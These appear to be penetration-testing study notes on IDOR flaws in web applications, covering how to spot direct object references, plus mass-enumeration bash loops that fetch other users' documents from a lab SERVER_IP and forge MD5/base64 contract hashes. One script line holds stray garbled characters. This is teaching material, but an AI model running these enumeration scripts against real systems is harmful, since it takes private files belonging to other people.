Occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects.

### Example
You upload a file and get the link to it like 
```URL
download.php?file_id=123
```
What happens if we try to download 
```URL
download.php?file_id=1234
```

## Identifying IDORs
### URL Parameters & APIs
1. Identifying Direct Object References
	* Study HTTP requests to look for URL parameters 
	* Try fuzzing applications to see if any data is returned
### AJAX Calls
* Unused parameters or APIs in the front-end code in the form of JavaScript. 
* Some web applications place all their function calls on the front-end and use appropriate ones based on the user role. 
```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
May be able to identify AJAX calls to specific-end-points or APIs that contain direct object references. 

### Hashing / Encoding
* Some web applications may not use sequential numbers as object references, but may encode the reference or hash it. 
* These can sometimes still be exploited
* If the encode was base64 we could decode the reference, change the value and then encode again. 
* If it is being hashed in viewable source code, you may be able to replicate it
```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
### Compare User Roles
May need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated. 
```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

## Mass IDOR Enumeration
### Insecure Parameters
Predictable paramters such as:
```url
http://website.com/file.php?uid-2
http://website.com/file.php?uid-1
```
Ensure that the UID doesn't change the file contents. Often websites are configured that the variable changes what files are being shown. 
### Mass Enumeration 
Grab the HTML source code:
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
Use grep to get the correct lines
```shell
 curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>
```
Trim the extra parts off 
```shell
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf
```
For Loop
```bash
#!/bin/bash
url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
    ~' '?/    done
done
```
### Bypassing Encoded References 
Sending to a `download.php` is a common name to download files to avoid directly linking to files. 
Data may look something like this
```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```
#### Function Disclosure
Many developers make mistakes of performing sensitive functions on the front-end.
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
##### Mass Enumeration
Once the formula is worked out we can write a script and then fuzz them variables
```shell
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

### Insecure APIs
#### Identify vulnerabilities 
* Edit fields and look at the request in BurpSuite
* `PUT` requests are usually APIs
* Look for hidden parameters in the `PUT` request 
* Are their any access control features such as roles or privileges?
#### Exploiting Insecure APIs

Example exploits
1. Change UIDs to take over someone else's account
2. Change a users details to perform web attacks
3. Create new users with arbitrary details
4. Change to a more privileged role

* Testing changing to incremental numbers or high numbers
* Test with `GET` requests as well as `PUT` requests 
### Chaining IDOR Vulnerabilities 
* If you can access other peoples details through a API request you may be able to get un-calculable variables, this may allow you to repeat a `PUT` request to modify a users details.
#### Example exploits 
* Modify their email and then a password reset request.  
* XSS payload
* 